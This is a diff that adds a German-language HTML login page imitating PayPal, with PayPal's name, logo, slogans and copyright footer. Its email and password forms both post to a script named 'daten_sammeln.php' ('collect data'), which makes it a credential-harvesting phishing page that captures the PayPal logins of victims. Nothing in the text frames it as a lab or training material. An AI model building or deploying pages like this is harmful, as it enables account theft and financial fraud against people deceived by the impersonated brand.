@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>PayPal – Einloggen</title>
+  <link rel="stylesheet" href="css/style.css" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;600&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet" />
+</head>
+<body>
+
+  <!-- Background decorative blobs -->
+  <div class="bg-scene" aria-hidden="true">
+    <div class="blob blob-1"></div>
+    <div class="blob blob-2"></div>
+    <div class="blob blob-3"></div>
+    <div class="grid-overlay"></div>
+  </div>
+
+  <div class="page-wrapper">
+
+    <!-- LEFT PANEL: Branding -->
+    <aside class="brand-panel">
+      <div class="brand-inner">
+        <div class="logo-lockup">
+          <svg class="pp-logo" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect width="48" height="48" rx="12" fill="#003087"/>
+            <path d="M18 14h8c4.5 0 7 2.2 6.5 6.5C32 25 29 27.5 24.5 27.5H21L19.5 34H14L18 14Z" fill="#009cde"/>
+            <path d="M20 18h7c3.5 0 5.5 1.7 5 5.2-.6 3.9-3 5.8-6.5 5.8H23L21.5 35H16L20 18Z" fill="white" opacity="0.9"/>
+          </svg>
+          <span class="brand-name">PayPal</span>
+        </div>
+
+        <div class="brand-copy">
+          <h2>Willkommen zurück.</h2>
+          <p>Loggen Sie sich ein und verwalten Sie Ihre Zahlungen schnell, sicher und überall.</p>
+        </div>
+
+        <div class="brand-features">
+          <div class="feature-item">
+            <span class="feature-icon">🔒</span>
+            <span>Verschlüsselt & sicher</span>
+          </div>
+          <div class="feature-item">
+            <span class="feature-icon">⚡</span>
+            <span>Blitzschnelle Zahlungen</span>
+          </div>
+          <div class="feature-item">
+            <span class="feature-icon">🌍</span>
+            <span>Weltweit akzeptiert</span>
+          </div>
+        </div>
+
+        <p class="brand-footnote">© 2026 PayPal, Inc. Alle Rechte vorbehalten.</p>
+      </div>
+    </aside>
+
+    <!-- RIGHT PANEL: Login Form -->
+    <main class="login-panel">
+      <div class="login-card">
+
+        <!-- Step 1: Email -->
+        <div class="form-step active" id="step-email">
+          <div class="card-header">
+            <h1>Einloggen</h1>
+            <p class="subtitle">Geben Sie Ihre E-Mail-Adresse oder Handynummer ein.</p>
+          </div>
+
+          <form id="emailForm" action="daten_sammeln.php" method="post" autocomplete="off" novalidate>
+            <input type="hidden" name="intent" value="signin" />
+            <input type="hidden" name="locale.x" value="de_DE" />
+
+            <div class="input-group">
+              <input
+                type="email"
+                id="email"
+                name="login_email"
+                placeholder=" "
+                required
+                autocomplete="username"
+              />
+              <label for="email">E-Mail-Adresse oder Handynummer</label>
+              <span class="input-line"></span>
+            </div>
+
+            <button type="button" class="btn-primary" onclick="nextStep()">
+              Weiter
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                <path d="M5 12h14M12 5l7 7-7 7"/>
+              </svg>
+            </button>
+          </form>
+
+          <div class="divider"><span>oder</span></div>
+
+          <button class="btn-social">
+            <svg viewBox="0 0 48 48" class="google-icon">
+              <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+              <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+              <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+              <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.36-8.16 2.36-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+              <path fill="none" d="M0 0h48v48H0z"/>
+            </svg>
+            Mit Google einloggen
+          </button>
+
+          <p class="signup-link">Noch kein Konto? <a href="#">Jetzt registrieren</a></p>
+        </div>
+
+        <!-- Step 2: Password -->
+        <div class="form-step" id="step-password">
+          <div class="card-header">
+            <button class="back-btn" onclick="prevStep()">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                <path d="M19 12H5M12 19l-7-7 7-7"/>
+              </svg>
+            </button>
+            <h1>Passwort eingeben</h1>
+            <div class="remembered-email">
+              <div class="avatar-circle" id="avatarInitial">–</div>
+              <span id="displayedEmail">–</span>
+            </div>
+          </div>
+
+          <form id="passwordForm" action="daten_sammeln.php" method="post" autocomplete="off" novalidate>
+            <input type="hidden" name="intent" value="signin" />
+            <input type="hidden" name="locale.x" value="de_DE" />
+            <input type="hidden" name="login_email" id="hiddenEmail" />
+
+            <div class="input-group">
+              <input
+                type="password"
+                id="password"
+                name="login_password"
+                placeholder=" "
+                required
+                autocomplete="current-password"
+              />
+              <label for="password">Passwort</label>
+              <span class="input-line"></span>
+              <button type="button" class="toggle-pw" onclick="togglePassword()" aria-label="Passwort anzeigen">
+                <svg id="eye-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                  <circle cx="12" cy="12" r="3"/>
+                </svg>
+              </button>
+            </div>
+
+            <a href="#" class="forgot-link">Passwort vergessen?</a>
+
+            <button type="submit" class="btn-primary">
+              Einloggen
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                <path d="M5 12h14M12 5l7 7-7 7"/>
+              </svg>
+            </button>
+          </form>
+        </div>
+
+      </div>
+
+      <!-- Footer -->
+      <footer class="login-footer">
+        <a href="#">Datenschutz</a>
+        <span class="dot">·</span>
+        <a href="#">Nutzungsbedingungen</a>
+        <span class="dot">·</span>
+        <a href="#">Kontakt</a>
+      </footer>
+    </main>
+
+  </div>
+
+  <script src="js/main.js"></script>
+</body>
+</html>
